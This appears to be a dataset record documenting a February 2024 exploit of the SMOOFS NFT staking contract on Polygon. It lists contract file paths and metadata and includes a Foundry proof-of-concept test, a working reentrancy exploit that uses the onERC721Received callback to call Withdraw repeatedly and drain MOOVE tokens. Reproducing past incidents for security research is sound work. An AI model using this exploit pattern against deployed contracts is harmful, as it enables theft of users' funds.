tracts/token/ERC20/extensions/IERC20Permit.sol", "data/contracts/2024_02_smoofsstaking/contracts/02_helper_3b6f71a5_smoofsstakingv3/sources/@openzeppelin/contracts/token/ERC20/IERC20.sol", "data/contracts/2024_02_smoofsstaking/contracts/02_helper_3b6f71a5_smoofsstakingv3/sources/@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol", "data/contracts/2024_02_smoofsstaking/contracts/02_helper_3b6f71a5_smoofsstakingv3/sources/@openzeppelin/contracts/token/ERC721/IERC721.sol", "data/contracts/2024_02_smoofsstaking/contracts/02_helper_3b6f71a5_smoofsstakingv3/sources/@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol", "data/contracts/2024_02_smoofsstaking/contracts/02_helper_3b6f71a5_smoofsstakingv3/sources/@openzeppelin/contracts/utils/Address.sol", "data/contracts/2024_02_smoofsstaking/contracts/02_helper_3b6f71a5_smoofsstakingv3/sources/@openzeppelin/contracts/utils/introspection/IERC165.sol", "data/contracts/2024_02_smoofsstaking/contracts/02_helper_3b6f71a5_smoofsstakingv3/sources/@openzeppelin/contracts/utils/StorageSlot.sol", "data/contracts/2024_02_smoofsstaking/contracts/02_helper_3b6f71a5_smoofsstakingv3/sources/contracts/SMOOFSStakingV3.sol"], "source_hint": "implementation of 0x757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c", "verification_status": "verified"}], "contracts_dir": "data/contracts/2024_02_smoofsstaking", "id": "2024_02_smoofsstaking", "metadata": {"ai_enabled": true, "ai_model": "gemini-2.5-flash-lite|gemini-2.5-flash-lite", "dataset_version": "1.0.0", "poc_parser_version": "1.0.0", "processed_at": "2026-04-10T06:36:40.650Z"}, "num_bytecode_contracts": 1, "num_contracts": 2, "num_source_contracts": 2, "num_verified_contracts": 2, "poc_code": "// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : Unclear
// Attacker : https://polygonscan.com/address/0x149b268b8b8101e2b5df84a601327484cb43221c
// Attack Contract : https://polygonscan.com/address/0x367120bf791cc03f040e2574aea0ca7790d3d2e5
// Vuln Contract : https://polygonscan.com/address/0x9d6cb01fb91f8c6616e822cf90a4b3d8eb0569c6
// One of the attack txs : https://app.blocksec.com/explorer/tx/polygon/0xde51af983193b1be3844934b2937a76c19610ddefcdd3ffcf127db3e68749a50

// @Analysis
// https://twitter.com/AnciliaInc/status/1762893563103428783


interface ISMOOFSStaking {
    function Stake(
        uint256 _tokenId
    ) external;

    function Withdraw(uint256 _tokenId, bool forceWithTax) external;
}

contract ContractTest is Test {
    ISMOOFSStaking private constant SMOOFSStaking = ISMOOFSStaking(0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C);
    IERC721 private constant Smoofs = IERC721(0x551eC76C9fbb4F705F6b0114d1B79bb154747D38);
    IERC20 private constant MOOVE = IERC20(0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d);
    address private constant attackContract = 0x367120bf791cC03F040E2574AeA0ca7790D3D2E5;
    uint256 private constant smoofsTokenId = 2062;
    uint256 setCount;

    function setUp() public {
        vm.createSelectFork("polygon", 54_056_707);
        vm.label(address(SMOOFSStaking), "SMOOFSStaking");
        vm.label(address(Smoofs), "Smoofs");
        vm.label(address(MOOVE), "MOOVE");
        vm.label(attackContract, "attackContract");
    }

    function testExploit() public {
        // For the purpose of this poc transfer Smoofs NFT token from original attack contract
        vm.prank(attackContract);
        Smoofs.transferFrom(attackContract, address(this), smoofsTokenId);
        Smoofs.approve(address(SMOOFSStaking), smoofsTokenId);

        // Set initial MOOVE token balance of this contract before attack
        deal(address(MOOVE), address(this), MOOVE.balanceOf(attackContract));
        MOOVE.approve(address(SMOOFSStaking), type(uint256).max);

        emit log_named_decimal_uint(
            "Attacker MOOVE balance before exploit", MOOVE.balanceOf(address(this)), MOOVE.decimals()
        );
        // In my case call to Stake() take some time when I ran POC for the first time.
        SMOOFSStaking.Stake(smoofsTokenId);
        SMOOFSStaking.Withdraw(smoofsTokenId, true);

        emit log_named_decimal_uint(
            "Attacker MOOVE balance after exploit", MOOVE.balanceOf(address(this)), MOOVE.decimals()
        );
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        while (setCount < 9) {
            ++setCount;
            Smoofs.safeTransferFrom(address(this), address(SMOOFSStaking), smoofsTokenId);
            SMOOFSStaking.Withdraw(smoofsTokenId, true);
        }
        return this.onERC721Received.selector;
    }
}
